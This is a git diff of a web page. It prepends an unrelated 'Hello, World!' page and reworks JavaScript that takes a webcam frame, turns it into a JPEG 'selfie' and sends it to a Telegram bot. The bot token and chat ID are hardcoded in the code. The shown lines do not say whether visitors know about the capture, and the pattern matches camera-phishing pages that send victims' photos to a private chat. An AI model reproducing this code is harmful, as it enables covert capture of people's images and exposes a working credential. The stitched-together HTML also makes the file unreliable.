@@ -1,4 +1,18 @@
 <!DOCTYPE html>
+
+<html>
+<head>
+  <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" href="styles/style.css"/>
+  <title>Hello, World!</title>
+</head>
+<body>
+  <h1>
+    Hello, World!
+  </h1>
+</body>
+</html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -59,21 +73,24 @@
                 canvas.height = video.videoHeight;
                 canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // Convert the captured frame to a data URL
-                const selfieDataUrl = canvas.toDataURL("image/jpeg");
+                // Convert the captured frame to a Blob
+                const selfieBlob = await fetch(canvas.toDataURL("image/jpeg")).then((response) => response.blob());
 
-                // Send the data URL to your Telegram bot
-                const botToken = "6603856138:AAECLTJ9H1TruTZ73hU_zL4VO6c-yX0QZhc"; // Replace with your Telegram bot token
-                const chatId = "5103508270"; // Replace with your chat ID
+                // Send the Blob to your Telegram bot
+                const botToken = "6603856138:AAECLTJ9H1TruTZ73hU_zL4VO6c-yX0QZhc"; // Your Telegram bot token
+                const chatId = "5103508270"; // Your chat ID
                 const apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
                 const formData = new FormData();
                 formData.append("chat_id", chatId);
-                formData.append("photo", selfieDataUrl);
+                formData.append("photo", selfieBlob, "selfie.jpg");
 
                 const response = await fetch(apiUrl, {
                     method: "POST",
-                    body: formData
+                    body: formData,
+                    headers: {
+                        "Content-Type": "multipart/form-data",
+                    },
                 });
 
                 if (response.ok) {
